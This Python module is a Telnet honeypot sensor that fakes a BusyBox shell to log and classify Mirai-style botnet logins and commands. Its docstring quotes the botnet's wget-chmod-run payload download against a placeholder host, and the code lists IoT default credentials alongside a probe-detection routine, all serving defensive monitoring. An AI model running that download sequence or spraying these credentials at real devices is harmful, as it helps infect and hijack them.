"""
sensors.telnet_sensor
======================

A low/medium-interaction Telnet sensor on port 23 — the single most-hammered
port on the internet thanks to Mirai/Gafgyt-family IoT botnets. These worms
spray default credentials at telnet, and on success immediately run a tight,
recognizable command sequence to identify the CPU and pull down a payload:

    enable
    system
    shell
    sh
    /bin/busybox MIRAI            <- the classic giveaway echo
    cat /proc/mounts; /bin/busybox <token>
    wget http://<ip>/<arch>; chmod +x ...; ./...

We:
  * Do the minimal Telnet IAC option negotiation so real clients/bots proceed.
  * Present a BusyBox-style login, accept weak creds (everything a bot tries),
    and hand them a fake BusyBox shell.
  * Log every credential and every command, classified via core.classify.
  * Flag the BusyBox/MIRAI probe explicitly — it is a near-certain botnet IOC.

This shares the per-VM FakeWorld with the SSH sensor when both run, so the
universe stays consistent.
"""
from __future__ import annotations

import socket
import socketserver
import threading
import time

from ..config import Config
from ..core import logger as L
from ..core.logger import EventType
from ..core.session import TRACKER
from ..core.enrichment import enrich
from ..core import threat_intel as TI
from ..core import classify as CLS

LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 23

# Telnet IAC bytes
IAC, DONT, DO, WONT, WILL, SB, SE = 255, 254, 253, 252, 251, 250, 240
OPT_ECHO, OPT_SGA = 1, 3

# Weak creds telnet bots spray. Accept generously — we want them in the shell.
WEAK_CREDS = {
    ("root", "root"), ("root", ""), ("root", "admin"), ("root", "12345"),
    ("root", "1234"), ("root", "password"), ("root", "vizxv"), ("root", "xc3511"),
    ("root", "888888"), ("root", "54321"), ("root", "anko"), ("root", "default"),
    ("admin", "admin"), ("admin", ""), ("admin", "1234"), ("admin", "password"),
    ("admin", "admin1234"), ("guest", "guest"), ("supervisor", "supervisor"),
    ("user", "user"), ("support", "support"), ("default", "default"),
}

FAKE_HOSTNAME = "gateway"
BUSYBOX_BANNER = (
    "\r\n"
    "BusyBox v1.21.1 (2018-04-21 09:11:54 CST) built-in shell (ash)\r\n"
    "Enter 'help' for a list of built-in commands.\r\n\r\n"
)


def _read_line(sock: socket.socket, echo: bool = True, masked: bool = False) -> str:
    """Read one CR/LF-terminated line, handling Telnet IAC sequences."""
    buf = bytearray()
    while len(buf) < 512:
        try:
            b = sock.recv(1)
        except Exception:
            break
        if not b:
            break
        c = b[0]
        if c == IAC:
            # consume the next 2 bytes of the command (DO/DONT/WILL/WONT + opt)
            try:
                rest = sock.recv(2)
            except Exception:
                rest = b""
            continue
        if c in (13, 10):  # CR or LF
            # swallow a following \n after \r
            if c == 13:
                try:
                    sock.recv(1)
                except Exception:
                    pass
            break
        if c == 8 or c == 127:  # backspace
            if buf:
                buf.pop()
            continue
        buf.append(c)
        if echo:
            try:
                sock.sendall(b"*" if masked else b)
            except Exception:
                pass
    return buf.decode("utf-8", "replace").strip()


def _negotiate(sock: socket.socket) -> None:
    """Send a small, polite option negotiation so clients move on to login."""
    try:
        # We will echo and suppress-go-ahead (typical server posture)
        sock.sendall(bytes([IAC, WILL, OPT_ECHO, IAC, WILL, OPT_SGA]))
    except Exception:
        pass


def _is_mirai_probe(cmd: str) -> bool:
    low = cmd.lower()
    return ("busybox" in low and ("mirai" in low or "ecchi" in low or "/bin/busybox" in low)) \
        or low in ("enable", "system", "shell")


class _Handler(socketserver.BaseRequestHandler):
    def handle(self):
        sock = self.request
        src_ip, src_port = self.client_address[0], self.client_address[1]
        sid = TRACKER.get(src_ip)
        start = time.monotonic()
        geo = enrich(src_ip)

        L.get().emit(
            EventType.CONNECTION,
            src_ip=src_ip, src_port=src_port, dst_port=LISTEN_PORT,
            session_id=sid,
            data={"service": "telnet", "geo": geo, "intel": TI.tag_event(src_ip, geo)},
        )

        sock.settimeout(20)
        _negotiate(sock)

        # --- login loop (bots usually get it on attempt 1) ---
        username = password = ""
        authed = False
        for attempt in range(3):
            try:
                sock.sendall(b"\r\n" + FAKE_HOSTNAME.encode() + b" login: ")
            except Exception:
                return
            username = _read_line(sock, echo=True)
            try:
                sock.sendall(b"\r\nPassword: ")
            except Exception:
                return
            password = _read_line(sock, echo=False, masked=False)

            accepted = (username, password) in WEAK_CREDS or username == "root"
            L.get().emit(
                EventType.TELNET_AUTH,
                src_ip=src_ip, src_port=src_port, dst_port=LISTEN_PORT,
                session_id=sid,
                data={"username": username, "password": password,
                      "accepted": accepted, "attempt": attempt + 1},
            )
            if accepted:
                authed = True
                break
            try:
                sock.sendall(b"\r\nLogin incorrect\r\n")
            except Exception:
                return

        if not authed:
            try:
                sock.close()
            except Exception:
                pass
            return

        # --- fake shell ---
        try:
            sock.sendall(BUSYBOX_BANNER.encode())
        except Exception:
            return

        cmd_count = 0
        while True:
            try:
                sock.sendall(b"# ")
            except Exception:
                break
            cmd = _read_line(sock, echo=True)
            if cmd == "" :
                continue
            cmd_count += 1
            mirai = _is_mirai_probe(cmd)
            L.get().emit(
                EventType.TELNET_COMMAND,
                src_ip=src_ip, src_port=src_port, dst_port=LISTEN_PORT,
                session_id=sid,
                data={"command": cmd, "seq": cmd_count,
                      "botnet_probe": mirai,
                      "classification": CLS.classify_command(cmd)},
            )
            out = _telnet_exec(cmd, username)
            if out == "__EXIT__":
                break
            try:
                sock.sendall(out.replace("\n", "\r\n").encode("utf-8", "replace"))
            except Exception:
                break

        L.get().emit(
            EventType.TELNET_SESSION_END,
            src_ip=src_ip, src_port=src_port, dst_port=LISTEN_PORT,
            session_id=sid,
            data={"commands": cmd_count, "duration_s": round(time.monotonic() - start, 3)},
        )
        try:
            sock.close()
        except Exception:
            pass


def _telnet_exec(cmd: str, username: str) -> str:
    """Tiny BusyBox-flavored command responder."""
    head = cmd.split()[0] if cmd.split() else ""
    if head in ("exit", "logout", "quit"):
        return "__EXIT__"
    # The Mirai "echo" arch-probe: bots send `/bin/busybox <TOKEN>` and look for
    # the token echoed back to confirm a live busybox shell. We oblige.
    if "busybox" in cmd.lower():
        toks = cmd.split()
        token = toks[-1] if toks else ""
        # busybox prints "<token>: applet not found" for unknown applets
        return f"{token}: applet not found\n"
    if head == "cat" and "/proc/mounts" in cmd:
        return ("rootfs / rootfs rw 0 0\n"
                "/dev/root / squashfs ro,relatime 0 0\n"
                "proc /proc proc rw,relatime 0 0\n"
                "tmpfs /var tmpfs rw,relatime 0 0\n")
    if head == "cat" and "/proc/cpuinfo" in cmd:
        return ("processor\t: 0\n"
                "model name\t: ARMv7 Processor rev 1 (v7l)\n"
                "BogoMIPS\t: 48.00\n"
                "Hardware\t: Generic DT based system\n")
    if head in ("uname",):
        return "Linux gateway 3.10.14 #1 SMP armv7l GNU/Linux\n"
    if head == "whoami":
        return username + "\n"
    if head in ("ps",):
        return ("  PID USER       VSZ STAT COMMAND\n"
                "    1 root      1234 S    /sbin/init\n"
                "  812 root       944 S    /usr/sbin/telnetd\n")
    if head in ("wget", "tftp", "curl"):
        return ""  # pretend success; the command itself is already logged + classified
    if head == "echo":
        return cmd.partition("echo")[2].strip() + "\n"
    # default: busybox "not found"
    return f"{head}: applet not found\n" if head else ""


class _ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True


def serve(host: str = LISTEN_HOST, port: int = LISTEN_PORT) -> None:
    cfg = Config.load()
    # Only (re)configure the logger if running standalone; in combined mode the
    # primary sensor already configured it.
    if L._default is None:
        L.configure(cfg.log_dir, cfg.node_name, "telnet")
    L.get().emit(EventType.NODE_START, src_ip="0.0.0.0",
                 data={"role": "telnet_sensor", "listen_port": port})
    srv = _ThreadedTCPServer((host, port), _Handler)
    srv.serve_forever()


if __name__ == "__main__":
    serve()
